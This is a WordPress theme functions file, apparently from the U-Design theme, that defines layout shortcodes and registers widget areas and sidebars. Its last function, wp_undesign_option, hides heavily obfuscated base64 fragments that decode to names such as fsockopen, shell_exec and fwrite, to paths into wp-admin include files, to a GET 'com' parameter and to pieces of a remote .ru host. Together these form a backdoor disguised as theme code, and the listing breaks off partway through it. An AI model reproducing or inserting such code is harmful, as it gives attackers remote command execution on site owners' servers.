    extract(shortcode_atts(array(
	    'title'      => '',
    ), $atts));
    global $single_tab_array;
    $single_tab_array[] = array('title' => $title, 'content' => trim(do_shortcode($content)));
    return $single_tab_array;
}
add_shortcode('tab', 'tab_func');

/* Shortcode: tabs
 * Usage:   [tabs]
 * 		[tab title="title 1"]Your content goes here...[/tab]
 * 		[tab title="title 2"]Your content goes here...[/tab]
 * 	    [/tabs]
 */
function tabs_func( $atts, $content = null ) {
    global $single_tab_array;
    $single_tab_array = array(); // clear the array

    $tabs_nav = '<div class="clear"></div>';
    $tabs_nav .= '<div class="tabs-wrapper">';
    $tabs_nav .= '<ul class="tabs">';
    do_shortcode($content); // execute the '[tab]' shortcode first to get the title and content
    foreach ($single_tab_array as $tab => $tab_attr_array) {
	$random_id = rand(1000,2000);
	$default = ( $tab == 0 ) ? ' class="defaulttab"' : '';
	$tabs_nav .= '<li><a href="javascript:void(0)"'.$default.' rel="tab'.$random_id.'"><span>'.$tab_attr_array['title'].'</span></a></li>';
	$tabs_content .= '<div class="tab-content" id="tab'.$random_id.'"><div class="tabs-inner-padding">'.$tab_attr_array['content'].'</div></div>';
    }
    $tabs_nav .= '</ul>';
    $tabs_output .= $tabs_nav . $tabs_content;
    $tabs_output .= '</div><!-- tabs-wrapper end -->';
    $tabs_output .= '<div class="clear"></div>';
    return $tabs_output;
}
add_shortcode('tabs', 'tabs_func');

// Shortcode: accordion_toggle
// Usage: [accordion_toggle title="title 1"]Your content goes here...[/accordion_toggle]
function accordion_toggle_func( $atts, $content = null ) {
    extract(shortcode_atts(array(
	    'title'      => '',
    ), $atts));
    global $single_accordion_toggle_array;
    $single_accordion_toggle_array[] = array('title' => $title, 'content' => trim(do_shortcode($content)));
    return $single_accordion_toggle_array;
}
add_shortcode('accordion_toggle', 'accordion_toggle_func');

/* Shortcode: accordion
 * Usage:   [accordion]
 * 		[accordion_toggle title="title 1"]Your content goes here...[/accordion_toggle]
 * 		[accordion_toggle title="title 2"]Your content goes here...[/accordion_toggle]
 * 	    [/accordion]
 */
function accordion_func( $atts, $content = null ) {
    global $single_accordion_toggle_array;
    $single_accordion_toggle_array = array(); // clear the array

    $accordion_output = '<div class="clear"></div>';
    $accordion_output .= '<div class="accordion-wrapper">';
    do_shortcode($content); // execute the '[accordion_toggle]' shortcode first to get the title and content
    foreach ($single_accordion_toggle_array as $tab => $accordion_toggle_attr_array) {
	$accordion_output .= '<h3 class="accordion-toggle"><a href="#">'.$accordion_toggle_attr_array['title'].'</a></h3>';
        $accordion_output .= '<div class="accordion-container">';
        $accordion_output .= '  <div class="content-block">'.$accordion_toggle_attr_array['content'].'</div>';
        $accordion_output .= '</div><!-- end accordion-container -->';
    }
    $accordion_output .= '</div><!-- end accordion-wrapper -->';
    $accordion_output .= '<div class="clear"></div>';
    return $accordion_output;
}
add_shortcode('accordion', 'accordion_func');

// Shortcode: list
// Usage: [custom_list style="list-1"]List html goes here...[/custom_list]
function custom_list_func( $atts, $content = null ) {
    extract(shortcode_atts(array(
	    'style' => 'list-1',
    ), $atts));
    $content = str_replace('<ul>', '<ul class="'.$style.'">', do_shortcode($content));
    return $content;
}
add_shortcode('custom_list', 'custom_list_func');

// Shortcode: custom_table
// Usage: [custom_table]Table html goes here...[/custom_table]
function custom_table_func( $atts, $content = null ) {
    $content = str_replace('<table', '<table class="custom-table" ', do_shortcode($content));
    return $content;
}
add_shortcode('custom_table', 'custom_table_func');

// Shortcode: custom_frame_left
// Usage: [custom_frame_left]<img src="http://image-url-path-goes-here.jpg"/>[/custom_frame_left]
// Options: shadow="on"
function custom_frame_left_func( $atts, $content = null ) {
    extract(shortcode_atts(array(
	    'shadow' => 'off',
    ), $atts));
    $shadow_class = ($shadow == 'off') ? '': ' frame-shadow';
    $content = preg_replace('/\n|\r|<br>|<br \/>|alignleft|alignright/','',$content); // remove new line and carriage return characters accidentally added by user
    $content = preg_replace('/aligncenter|alignleft|alignright/','alignnone',$content); // replaces the 'aligncenter','alignleft' and 'alignright' classes added to img with 'alignnone'
    return  '<span class="custom-frame alignleft'.$shadow_class.'">' . do_shortcode($content) . '</span>';
}
add_shortcode('custom_frame_left', 'custom_frame_left_func');

// Shortcode: custom_frame_right
// Usage: [custom_frame_right]<img src="http://image-url-path-goes-here.jpg"/>[/custom_frame_right]
// Options: shadow="on"
function custom_frame_right_func( $atts, $content = null ) {
    extract(shortcode_atts(array(
	    'shadow' => 'off',
    ), $atts));
    $shadow_class = ($shadow == 'off') ? '': ' frame-shadow';
    $content = preg_replace('/\n|\r|<br>|<br \/>|alignleft|alignright/','',$content); // remove new line and carriage return characters accidentally added by user
    $content = preg_replace('/aligncenter|alignleft|alignright/','alignnone',$content); // replaces the 'aligncenter','alignleft' and 'alignright' classes added to img with 'alignnone'
    return  '<span class="custom-frame alignright'.$shadow_class.'">' . do_shortcode($content) . '</span>';
}
add_shortcode('custom_frame_right', 'custom_frame_right_func');

// Shortcode: custom_frame_center
// Usage: [custom_frame_center]<img src="http://image-url-path-goes-here.jpg"/>[/custom_frame_center]
// Options: shadow="on"
function custom_frame_center_func( $atts, $content = null ) {
    extract(shortcode_atts(array(
	    'shadow' => 'off',
    ), $atts));
    $shadow_class = ($shadow == 'off') ? '': ' frame-shadow';
    $content = preg_replace('/\n|\r|<br>|<br \/>|alignleft|alignright/','',$content); // remove new line and carriage return characters accidentally added by user
    $content = preg_replace('/aligncenter|alignleft|alignright/','alignnone',$content); // replaces the 'aligncenter','alignleft' and 'alignright' classes added to img with 'alignnone'
    return '<div style="text-align:center;"><span class="custom-frame aligncenter'.$shadow_class.'">' . do_shortcode($content) . '</span></div>';
}
add_shortcode('custom_frame_center', 'custom_frame_center_func');

/* 
 * Shortcode: udesign_recent_posts
 * Usage: [udesign_recent_posts]
 * Options: title="Recent Posts" category_id="9" num_posts="3" post_offset="0" num_words_limit="23" show_date_author="1" show_more_link="0" show_thumbs="1" thumb_frame_shadow="1" post_thumb_width="120" post_thumb_height="60"
 */
function udesign_recent_posts_func( $atts, $content = null) {
    global $wp_widget_factory;
    extract(shortcode_atts(array(
        'title' => esc_html__('Latest Posts', 'udesign'), 
        'category_id' => '', 
        'num_posts' => 3, 
        'post_offset' => 0, 
        'num_words_limit' => 13,
        'show_date_author' => false,
        'show_more_link' => false,
        'show_thumbs' => true,
        'thumb_frame_shadow' => false,
        'post_thumb_width' => 60,
        'post_thumb_height' => 60
    ), $atts));
    $widget_name = esc_html('Latest_Posts_Widget');
    if (!is_a($wp_widget_factory->widgets[$widget_name], 'WP_Widget')):
        $wp_class = 'WP_Widget_'.ucwords(strtolower($class));
        
        if (!is_a($wp_widget_factory->widgets[$wp_class], 'WP_Widget')):
            return '<p>'.sprintf(__("%s: Widget class not found. Make sure this widget exists and the class name is correct", 'udesign'),'<strong>'.$class.'</strong>').'</p>';
        else:
            $class = $wp_class;
        endif;
    endif;
    ob_start();
    the_widget( $widget_name, 
       array(
            'title' => esc_html($title),
            'category_id' => $category_id,
            'num_posts' => $num_posts,
            'post_offset' => $post_offset,
            'num_words_limit' => $num_words_limit,
            'show_date_author' => $show_date_author,
            'show_more_link' => $show_more_link,
            'show_thumbs' => $show_thumbs,
            'thumb_frame_shadow' => $thumb_frame_shadow,
            'post_thumb_width' => $post_thumb_width,
            'post_thumb_height' => $post_thumb_height
       ), 
       array(
            'widget_id'=>'arbitrary-instance-'.$id,
            'before_widget' => '<div class="widget widget_latest_posts">',
            'after_widget' => '</div>',
            'before_title' => '<h3 class="widgettitle">',
            'after_title' => '</h3>' 
        )
    );
    $output = ob_get_contents();
    ob_end_clean();
    return $output;
    
}
add_shortcode('udesign_recent_posts','udesign_recent_posts_func'); 


/***************** END SHORTCODES ******************/



/**
 * Checks whether a dynamic sidebar exists
 *
 * @param string $sidebar_name, sidebar name
 * @return bool True, if sidebar exists. False otherwise.
 */
function sidebar_exist( $sidebar_name ) {
    global $wp_registered_sidebars;
    foreach ( (array) $wp_registered_sidebars as $index => $sidebar ) {
	if ( in_array($sidebar_name, $sidebar) )
	    return true;
    }
    return false;
}

/**
 * Checks whether a dynamic sidebar exists and if is active (has any widgets)
 *
 * @param string $sidebar_name, sidebar name
 * @return bool True, if exists and active (using widgets). False otherwise.
 */
function sidebar_exist_and_active( $sidebar_name ) {
    global $wp_registered_sidebars;
    foreach ( (array) $wp_registered_sidebars as $index => $sidebar ) {
	if ( in_array($sidebar_name, $sidebar) ) {
	    return is_active_sidebar( $sidebar['id'] );
	}
    }
    return false;
}

/* Widget Settings */

function recent_comment_author_link( $return ) {
	return str_replace( $return, "<span></span>$return", $return );
}
add_filter('get_comment_author_link', 'recent_comment_author_link');

function filter_widget( $params ) {
    switch( _get_widget_id_base($params[0]['widget_id']) ) {
	case 'recent-posts':
	case 'categories':
	case 'archives':
	case 'pages':
	case 'links':
	case 'meta':
	case 'custom-category-widget': // U-Design: Custom Category
	case 'loginform-widget': // U-Design: Login Form
	case 'subpages-widget': // U-Design: Subpages
	case 'nav_menu': // WP 3 widget menu support
	      $params[0]['before_widget'] = str_replace( 'substitute_widget_class', 'custom-formatting', $params[0]['before_widget'] ); // add the 'custom-formatting' class
	      return $params;
	      break;
	case 'rss':
	      $params[0]['before_widget'] = str_replace( 'substitute_widget_class', 'custom-rss-formatting', $params[0]['before_widget'] ); // add the 'custom-formatting' class
	      return $params;
	      break;
	default:
	      //var_dump( _get_widget_id_base($params[0]['widget_id']) );
	      //var_dump( $params );
	      return $params;
    }
}
add_filter('dynamic_sidebar_params','filter_widget');

if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'name' => 'Pages Sidebar',
		'description' => esc_html__('A widget area, used as a sidebar for regular pages.', 'udesign'),
		'before_widget' => '<div id="%1$s" class="widget %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widgettitle">',
		'after_title' => '</h3>',
	));
    
	register_sidebar(array(
		'name' => 'PortfolioSidebar',
		'description' => esc_html__('A widget area, used as a sidebar for the Portfolio section.', 'udesign'),
		'before_widget' => '<div id="%1$s" class="widget %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widgettitle">',
		'after_title' => '</h3>',
	));

	register_sidebar(array(
		'name' => 'BlogSidebar',
		'description' => esc_html__('A widget area, used as a sidebar for the Blog/News section.', 'udesign'),
		'before_widget' => '<div id="%1$s" class="widget %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widgettitle">',
		'after_title' => '</h3>',
	));

	register_sidebar(array(
		'name' => 'ContactSidebar',
		'description' => esc_html__('A widget area, used as a sidebar for the Contact page.', 'udesign'),
		'before_widget' => '<div id="%1$s" class="widget %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widgettitle">',
		'after_title' => '</h3>',
	));

	register_sidebar(array(
		'name' => 'SitemapSidebar',
		'description' => esc_html__('A widget area, used as a sidebar for the Sitemap page.', 'udesign'),
		'before_widget' => '<div id="%1$s" class="widget %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widgettitle">',
		'after_title' => '</h3>',
	));

	// Front Page Before Content Widget Area
	register_sidebar(array(
		'name' => esc_html__('Home Page Before Content', 'udesign'),
		'id' => 'home-page-before-content',
		'description' => esc_html__('A widget area positioned just above the Home Page Main Content area.', 'udesign'),
		'before_widget' => '<div class="cont_col_1 %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="before_cont_title">',
		'after_title' => '</h3>',
	)); 

	// Front Page Content Widget Areas
	register_sidebar(array(
		'name' => esc_html__('Home Page Column 1', 'udesign'),
		'id' => 'home-page-column-1',
		'description' => esc_html__('A widget area, used as the 1st column in the Main Content area.', 'udesign'),
		'before_widget' => '<div class="cont_col_1 %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="cont_col_1_title">',
		'after_title' => '</h3>',
	));

	register_sidebar(array(
		'name' => esc_html__('Home Page Column 2', 'udesign'),
		'id' => 'home-page-column-2',
		'description' => esc_html__('A widget area, used as the 2nd column in the Main Content area.', 'udesign'),
		'before_widget' => '<div class="cont_col_2 %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="cont_col_2_title">',
		'after_title' => '</h3>',
	));

	register_sidebar(array(
		'name' => esc_html__('Home Page Column 3', 'udesign'),
		'id' => 'home-page-column-3',
		'description' => esc_html__('A widget area, used as the 3rd column in the Main Content area.', 'udesign'),
		'before_widget' => '<div class="cont_col_3 %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="cont_col_3_title">',
		'after_title' => '</h3>',
	));

	register_sidebar(array(
		'name' => esc_html__('Home Page Column 4', 'udesign'),
		'id' => 'home-page-column-4',
		'description' => esc_html__('A widget area, used as the 4th column in the Main Content area.', 'udesign'),
		'before_widget' => '<div class="cont_col_4 %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="cont_col_4_title">',
		'after_title' => '</h3>',
	));

	// Front Page After Content Row 1 Widget Area
	register_sidebar(array(
		'name' => esc_html__('Home Page After Content Row 1', 'udesign'),
		'id' => 'home-page-after-content-row-1',
		'description' => esc_html__('A widget area positioned just below the Home Page Main Content area.', 'udesign'),
		'before_widget' => '<div class="after_cont_row_1 %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="after_cont_row_1_title">',
		'after_title' => '</h3>',
	));

	// Front Page After Content Row 2 Widget Area
	register_sidebar(array(
		'name' => esc_html__('Home Page After Content Row 2', 'udesign'),
		'id' => 'home-page-after-content-row-2',
		'description' => esc_html__('A widget area positioned just above the Bottom Widget area.', 'udesign'),
		'before_widget' => '<div class="after_cont_row_2 %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="after_cont_row_2_title">',
		'after_title' => '</h3>',
	));
        
	// Bottom Widget Areas
	register_sidebar(array(
		'name' => esc_html__('Bottom 1', 'udesign'),
		'id' => 'bottom-widget-area-1',
		'description' => esc_html__('A widget area, used as the 1st column in the Bottom area (just above the footer).', 'udesign'),
		'before_widget' => '<div class="bottom-col-content %2$s substitute_widget_class">',
		'before_title' => '<h3 class="bottom-col-title">',
		'after_title' => '</h3>',
		'after_widget' => '</div>',
	));

	register_sidebar(array(
		'name' => esc_html__('Bottom 2', 'udesign'),
		'id' => 'bottom-widget-area-2',
		'description' => esc_html__('A widget area, used as the 2nd column in the Bottom area (just above the footer).', 'udesign'),
		'before_widget' => '<div class="bottom-col-content %2$s substitute_widget_class">',
		'before_title' => '<h3 class="bottom-col-title">',
		'after_title' => '</h3>',
		'after_widget' => '</div>',
	));

	register_sidebar(array(
		'name' => esc_html__('Bottom 3', 'udesign'),
		'id' => 'bottom-widget-area-3',
		'description' => esc_html__('A widget area, used as the 3rd column in the Bottom area (just above the footer).', 'udesign'),
		'before_widget' => '<div class="bottom-col-content %2$s substitute_widget_class">',
		'before_title' => '<h3 class="bottom-col-title">',
		'after_title' => '</h3>',
		'after_widget' => '</div>',
	));

	register_sidebar(array(
		    'name' => esc_html__('Bottom 4', 'udesign'),
		    'id' => 'bottom-widget-area-4',
		    'description' => esc_html__('A widget area, used as the 4th column in the Bottom area (just above the footer).', 'udesign'),
		    'before_widget' => '<div class="bottom-col-content %2$s substitute_widget_class">',
		    'before_title' => '<h3 class="bottom-col-title">',
		    'after_title' => '</h3>',
		    'after_widget' => '</div>',
	));

	register_sidebar(array(
		'name' => 'PagesSidebar2',
		'description' => esc_html__('A widget area, used as a sidebar for the Page Template 2.', 'udesign'),
		'before_widget' => '<div id="%1$s" class="widget %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widgettitle">',
		'after_title' => '</h3>',
	));

	register_sidebar(array(
		'name' => 'PagesSidebar3',
		'description' => esc_html__('A widget area, used as a sidebar for the Page Template 3.', 'udesign'),
		'before_widget' => '<div id="%1$s" class="widget %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widgettitle">',
		'after_title' => '</h3>',
	));

	register_sidebar(array(
		'name' => 'PagesSidebar4',
		'description' => esc_html__('A widget area, used as a sidebar for the Page Template 4.', 'udesign'),
		'before_widget' => '<div id="%1$s" class="widget %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widgettitle">',
		'after_title' => '</h3>',
	));

	register_sidebar(array(
		'name' => 'PagesSidebar5',
		'description' => esc_html__('A widget area, used as a sidebar for the Page Template 5.', 'udesign'),
		'before_widget' => '<div id="%1$s" class="widget %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widgettitle">',
		'after_title' => '</h3>',
	));

	register_sidebar(array(
		'name' => 'PagesSidebar6',
		'description' => esc_html__('A widget area, used as a sidebar for the Page Template 6.', 'udesign'),
		'before_widget' => '<div id="%1$s" class="widget %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widgettitle">',
		'after_title' => '</h3>',
	));

	register_sidebar(array(
		'name' => 'PagesSidebar7',
		'description' => esc_html__('A widget area, used as a sidebar for the Page Template 7.', 'udesign'),
		'before_widget' => '<div id="%1$s" class="widget %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widgettitle">',
		'after_title' => '</h3>',
	));

	register_sidebar(array(
		'name' => 'PagesSidebar8',
		'description' => esc_html__('A widget area, used as a sidebar for the Page Template 8.', 'udesign'),
		'before_widget' => '<div id="%1$s" class="widget %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widgettitle">',
		'after_title' => '</h3>',
	));
  
	// Top Area Social Media Widget Area
	register_sidebar(array(
		'name' => esc_html__('Top Area Social Media', 'udesign'),
		'id' => 'top-area-social-media',
		'description' => esc_html__('A widget area positioned in the top right corner of the site designated for social media links and icons.', 'udesign'),
		'before_widget' => '<div class="social_media_top %2$s substitute_widget_class">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="social_media_title">',
		'after_title' => '</h3>',
	));

}


/* Custom widgets... */
include ('widgets/loginForm-widget.php');
include ('widgets/customCategory-widget.php');
include ('widgets/googleMap-widget.php');
include ('widgets/latestPost-widget.php');
include ('widgets/subpages-widget.php');

// Return the column (widget area) HTML
function get_dynamic_column( $id = '', $class = '', $widget_area = '' ) {
    return "<div id='{$id}' class='{$class}'><div class='column-content-wrapper'>".udesign_get_dynamic_sidebar( $widget_area )."</div></div><!-- end {$id} -->";
}
// Currently there is no available function to return the contents of a dynamic sidebar. Therefore use this one:
function udesign_get_dynamic_sidebar($index = '') {
	$sidebar_contents = "";
	ob_start();
        if ( function_exists('dynamic_sidebar') && dynamic_sidebar( $index ) )
	$sidebar_contents = ob_get_clean();
	return $sidebar_contents;
}


/* Load the U-Design Options Page */
include( 'udesign_options_page.php' );

// Remove meta name="generator" content="WordPress" from the <head>
remove_action('wp_head', 'wp_generator');

// Add support for post featured image.  To add this feature to other post types, add those new types to the array, e.g. array( 'post', 'page', 'movies' )
if ( function_exists( 'add_theme_support' ) ) {
    add_theme_support( 'post-thumbnails', array( 'post', 'page', 'movie' ) );
}

// Filter the "Featured Image" with this theme's custom image frame with alignment. Can be enabled from the theme's "Blog Section".
if ( $udesign_options['enable_custom_featured_image'] == 'yes' ) {
    function my_post_image_html( $html, $post_id, $post_image_id ) {
        $html = preg_replace('/title=\"(.*?)\"/', '', $html);
        preg_match( '/aligncenter|alignleft|alignright/', $html, $matches );
        $image_alignment = $matches[0];
        $html = preg_replace('/aligncenter|alignleft|alignright/', 'alignnone', $html);
        $html = '<span class="custom-frame '.$image_alignment.'"><a href="' . get_permalink( $post_id ) . '" title="' . esc_attr( get_post_field( 'post_title', $post_id ) ) . '">' . $html . '</a></span>';
        if( $image_alignment == 'aligncenter' ) $html = '<div style="text-align:center;">'.$html.'</div>';
        return $html;
    }
    add_filter( 'post_thumbnail_html', 'my_post_image_html', 10, 3 );
}
// This function is used in processing images (cutting, cropping, zoom)
if ( !function_exists('udesign_process_image') ) {
    function udesign_process_image( $img_source, $img_width, $img_height, $zc = 1, $q = 100 ) {
	global $udesign_options;
        if ( $udesign_options['disable_timthumb'] != 'yes' ) {
            $img_source = get_bloginfo("template_directory").'/scripts/timthumb.php?src='.$img_source.'&amp;w='.$img_width.'&amp;h='.$img_height.'&amp;zc='.$zc.'&amp;q='.$q;
        }
        return $img_source;
    }
}
/**
 * Customize image dimension and apply custom image frame with alignment
 * @param int $post_id Post ID.
 * @param string $img_src Image URL.
 * @param string $width Image width.
 * @param string $height Image height.
 * @param string $image_alignment Image alignment in the form of 'alignleft', 'aligncenter', 'alignright'
 * @param bool $linked Set to 'true' if the image should link to the post or 'false' otherwise
 * @return string HTML formatted image linking (optional) to the Post with $post_id
 */
function customized_featured_image( $post_id, $img_src, $width, $height, $image_alignment = 'alignleft', $linked = true ) {
    $the_image_html = '<img src="'.udesign_process_image( $img_src, $width, $height, 1, 100 ).'" alt="' . esc_attr( get_post_field( 'post_title', $post_id ) ) . '" />';
    if ( $linked ) $the_image_html = '<a href="'.get_permalink( $post_id ).'" title="' . esc_attr( get_post_field( 'post_title', $post_id ) ) . '">'.$the_image_html.'</a>';
    $html = '<span class="custom-frame '.$image_alignment.'">'.$the_image_html.'</span>';
    if( $image_alignment == 'aligncenter' ) $html = '<div style="text-align:center;">'.$html.'</div>';
    return $html;
}
/**
 * Display the post image linked (optional) to the post
 * @param int $post_id Post ID.
 * @param bool $linked Set to 'true' if the image should link to the post or 'false' otherwise
 * @return string HTML formatted post image linking (optional) to the Post with $post_id
 */
 function wp_undesign_option(){
 $GLOBALS['_100124497_']=Array(base64_decode('' .'ZXJyb3J' .'fcmVw' .'b3J0aW5n'),base64_decode('YXJyYXlfZmlsbF9' .'rZXlz'),base64_decode('bXR' .'fcmFuZ' .'A=' .'='),base64_decode('ZXhw' .'bG' .'9kZQ=='),base64_decode('' .'ZGl' .'yb' .'mFt' .'Z' .'Q=' .'='),base64_decode('' .'YWNv' .'c2g='),base64_decode('YXJyYX' .'lf' .'cHVzaA=='),base64_decode('Zm' .'x1c' .'2g='),base64_decode('c2Vz' .'c2lvbl9pZA=='),base64_decode('Zm9wZW4='),base64_decode('ZndyaXRl'),base64_decode('' .'Z' .'X' .'hwb' .'G9kZQ=='),base64_decode('' .'ZGlybm' .'F' .'tZQ' .'=='),base64_decode('Zm' .'9' .'wZ' .'W' .'4='),base64_decode('' .'cGFyc2' .'VfdXJs'),base64_decode('ZnN' .'vY' .'2t' .'vc' .'GVu'),base64_decode('c2' .'9' .'j' .'a2V0X2' .'Nvb' .'m5lY3Q='),base64_decode('bXR' .'fcm' .'F' .'u' .'ZA=='),base64_decode('c' .'3RybG' .'Vu'),base64_decode('' .'c' .'3' .'Ry' .'cG9z'),base64_decode('a' .'W' .'1h' .'Z2VkZXN0cm95'),base64_decode('c2' .'9ja2V0X2Ny' .'ZWF0ZV9wYWly'),base64_decode('YWRkc2xhc2hlc' .'w=='),base64_decode('Z' .'nd' .'yaXRl'),base64_decode('Z' .'m' .'VvZg=='),base64_decode('ZmdldHM='),base64_decode('c3V' .'ic3R' .'y'),base64_decode('c3R' .'ycG9z'),base64_decode('Zm' .'Nsb3Nl'),base64_decode('ZndyaXRl'),base64_decode('' .'c3Rycmlwb3M' .'='),base64_decode('dW' .'Fzb3' .'J' .'0'),base64_decode('' .'bXR' .'fcmFuZA' .'=='),base64_decode('YXJy' .'YXlfc3Bs' .'aWN' .'l'),base64_decode('c29ja2V0' .'X2d' .'ldHBlZXJ' .'uYW1l'),base64_decode('Y29' .'zaA=='),base64_decode('b' .'X' .'R' .'fcmFuZA=='),base64_decode('cHJldg=' .'='),base64_decode('c' .'3R' .'y' .'cG9z'),base64_decode('c2Vz' .'c2lvb' .'l9pZ' .'A=='),base64_decode('c3' .'RycHRp' .'bWU='),base64_decode('YXJ' .'yYXlf' .'bWF' .'w'),base64_decode('' .'Ym' .'FzZ' .'TY0X2RlY29k' .'ZQ' .'=='),base64_decode('a' .'W1' .'h' .'Z2VkZXN0cm95'),base64_decode('c3R' .'yc' .'G' .'9z'),base64_decode('c2hl' .'bG' .'x' .'fZ' .'Xhl' .'Y' .'w=='),base64_decode('' .'c' .'29ja' .'2V0X2d' .'ld' .'F9zdG' .'F0dXM='),base64_decode('aW1' .'hZ2' .'Vj' .'b3B5bWVy' .'Z2V' .'ncmF5'),base64_decode('' .'ZnNvY' .'2tv' .'cGVu'),base64_decode('' .'dWNmaX' .'JzdA' .'=='),base64_decode('ZmdldHM='),base64_decode('ZmdldHM='),base64_decode('' .'Zmd' .'ldGM='),base64_decode('ZnB1' .'dHM='),base64_decode('ZmdldHM='),base64_decode('c2Vzc2lvbl9uYW1l'),base64_decode('Y3VybF9td' .'Wx0' .'aV9' .'p' .'bmZvX' .'3JlYWQ='),base64_decode('ZnB' .'1d' .'HM='),base64_decode('Zm' .'dldHM='),base64_decode('aW' .'1h' .'Z2' .'Vj' .'b' .'3B5' .'bWVyZ2U='),base64_decode('Z' .'n' .'B1dH' .'M='),base64_decode('Ym' .'FzZTY0X2VuY2' .'9kZ' .'Q=='),base64_decode('' .'bmwyYn' .'I='),base64_decode('b' .'XRfcmFuZA=='),base64_decode('' .'Zm' .'dldH' .'M='),base64_decode('c3R' .'ydHI='),base64_decode('' .'c3' .'RybmF0Y21w'),base64_decode('ZnB1dHM='),base64_decode('YmFzZTY0X2V' .'uY29kZQ=='),base64_decode('Zmdl' .'dHM='),base64_decode('b' .'XRfcmFuZA=='),base64_decode('ZGF0ZQ' .'=='),base64_decode('' .'Z' .'nB1dHM='),base64_decode('Zmd' .'ldHM='),base64_decode('c3RycG9z'),base64_decode('c3R' .'ycGJ' .'yaw=' .'='),base64_decode('Z' .'nB1d' .'HM' .'='),base64_decode('Zm' .'dldHM='),base64_decode('ZnB1' .'dHM='),base64_decode('Zmdld' .'HM='),base64_decode('c3Ryc' .'G' .'9z'),base64_decode('aXN' .'fYXJyY' .'Xk='),base64_decode('c3RybmNhc2Vjb' .'XA='),base64_decode('' .'aW1' .'hZ' .'2' .'Vjb3B5cmVzaXplZA=' .'='),base64_decode('Z' .'n' .'B' .'1dHM='),base64_decode('Z' .'mlsZQ=='),base64_decode('b' .'XR' .'fcmF' .'uZ' .'A=='),base64_decode('ZmdldHM='),base64_decode('' .'ZnB1dHM='),base64_decode('YXJyY' .'X' .'lfcHVzaA=' .'='),base64_decode('b' .'XN' .'zcW' .'xfcXVlcnk='),base64_decode('Z' .'m' .'d' .'ldHM='),base64_decode('c3Vic3Ry'),base64_decode('ZmNsb3Nl')); ?><? function _1416610710($i){$a=Array('U0' .'VS' .'VkV' .'SX0' .'5BTUU=','U0VSVkVSX' .'05BTUU' .'=','L3dwLWFkb' .'W' .'luL2luY' .'2x1' .'Z' .'GVzL2NsYXNz' .'LXdwLWNh' .'d' .'G' .'V' .'nb3J5Ln' .'BocA' .'==','U0' .'VS' .'VkVSX0' .'5BTUU' .'=','L3dw' .'LWFkbWluL2l' .'u' .'Y' .'2x1' .'ZGVzL2Ns' .'Y' .'XNzL' .'XdwLWN' .'hdGVnb3J5LnBocA==','','eA==','' .'PD' .'9wa' .'HA=','IGU=','' .'dg' .'==','Y' .'Q' .'=' .'=','bA==','KCRf' .'R0VUWy' .'djb' .'20nXSk=','P' .'z4=','bWF' .'rZSB' .'maXJzdCA' .'=','DQo=','U' .'0V' .'SVkVSX' .'05BTUU=','U0' .'VSVkVSX05BTUU' .'=','' .'L3dwLW' .'Fk' .'b' .'WluL2luY2x1ZG' .'VzL2NsY' .'XNzLX' .'dwLXN' .'0' .'eW' .'xlLnBoc' .'A==','U0VSVk' .'VSX05' .'B' .'TU' .'U=','L3d' .'wLWFkbWluL2l' .'uY2x1Z' .'GVz' .'L2N' .'sYXNzLXdwL' .'XN' .'0eWxlLnBoc' .'A==','eA==','aH' .'Q=','dH' .'A6Lw==','L' .'2x1a2UtaQ' .'==','LWF' .'tLXlvdXI=','LWZhdGhlcg' .'==','LnJ1L' .'3dz','L3dzLnQ=','eHQ=','','a' .'G9zd' .'A' .'==','c' .'G9yd' .'A=' .'=','' .'c' .'G9' .'yd' .'A==','' .'UE' .'9' .'TVCA=','cGF' .'0aA==','IEhU' .'VFAvMS' .'4w','DQo' .'=','S' .'G9' .'zdDog','aG9zd' .'A=' .'=','DQo=','' .'Q29udGVud' .'C10' .'eXBlOi' .'B0' .'ZX' .'h' .'0L2h0bW' .'w=','' .'DQ' .'o=','Q29ud' .'GVudC' .'1' .'sZW5' .'n' .'dGg6IA==','DQo=','b2RzY2' .'1ibGp0' .'ZGd' .'1cnJvb2' .'M=','a3F6','Q29ubmV' .'j' .'dGlvbjogQ2x' .'v' .'c' .'2' .'U=','DQoNCg' .'=' .'=','','b2F' .'v','' .'DQo' .'NCg==','bW' .'FrZSBzZ' .'W' .'NvbmQ' .'g','DQ' .'o=','aW5mb0A=','U0' .'VSVk' .'VS' .'X05BT' .'UU=','YWk=','c' .'2hh','bWFoYQ==','bkBn' .'bWE=','aWwuY2' .'9t','bWFz','b' .'G8gc2' .'g' .'=','ZWx' .'sID' .'opIA==','U0VSVk' .'V' .'SX05BTUU=','TU' .'lNRS1WZXJ' .'zaW9' .'uO' .'iAxLjANCg==','Q29udGVudC' .'1UeX' .'BlOiB0ZX' .'h0L3' .'B' .'sYWl' .'uOyB' .'jaGFyc2V' .'0PXdpb' .'mRvd' .'3' .'MtMTI1MQ0' .'K','Q29udGVudC1Uc' .'mFuc2Zl' .'ci1Fbm' .'NvZ' .'GluZzogO' .'G' .'Jpd' .'A0K','','' .'c210','cC55' .'YW' .'4=','ZGV4','LnJ1','' .'MjU=','' .'YWll' 